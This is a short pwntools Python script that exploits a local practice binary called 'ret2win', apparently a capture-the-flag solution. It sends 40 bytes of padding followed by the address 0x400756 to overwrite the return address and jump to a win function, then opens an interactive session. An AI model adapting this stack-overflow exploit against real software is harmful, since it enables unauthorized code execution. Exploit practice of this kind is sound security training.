from pwn import *

r = process("./ret2win")

ret2win = 0x400756
payload = b'a'*40 + p64(ret2win)
r.sendafter('> ', payload)
r.interactive()